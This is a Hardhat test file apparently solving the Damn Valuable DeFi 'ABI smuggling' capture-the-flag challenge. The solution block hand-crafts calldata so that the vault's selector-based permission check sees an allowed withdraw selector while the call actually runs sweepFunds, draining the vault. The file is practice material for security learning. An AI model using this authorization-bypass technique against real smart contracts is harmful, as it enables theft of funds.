const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, recovery] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        /**
    "6f85c7e4": "WAITING_PERIOD()",
    "82ee0d1d": "WITHDRAWAL_LIMIT()",
    "1cff79cd": "execute(address,bytes)",
    "3e152499": "getActionId(bytes4,address,address)",
    "266df782": "getLastWithdrawalTimestamp()",
    "158ef93e": "initialized()",
    "b4d2388f": "permissions(bytes32)",
    "aeabae6b": "setPermissions(bytes32[])",
    "85fb709d": "sweepFunds(address,address)",
    "d9caed12": "withdraw(address,address,uint256)"
         */

        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        console.log({ playerPermission });
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        await ethers.provider.send("evm_increaseTime", [20 * 24 * 60 * 60]);

        const args = ethers.utils.defaultAbiCoder.encode(["address", "address", "uint256"], [token.address, recovery.address, 1000]);
        const calldata = "0xd9caed12" + args.slice(2);

        const hackData = [
            // outer call
            "0x1cff79cd",
            "000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512",
            "0000000000000000000000000000000000000000000000000000000000000064",
            "0000000000000000000000000000000000000000000000000000000000000000",
            "d9caed12",

            // inner call
            "0000000000000000000000000000000000000000000000000000000000000044",
            "85fb709d",
            "0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc",
            "0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"]

        // idk why provider.call did not work
        await player.sendTransaction({
            from: player.address,
            to: vault.address,
            data: hackData.join(''),
            gasLimit: 5000000,
        });

        // await vault.connect(player).execute(vault.address, calldata);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
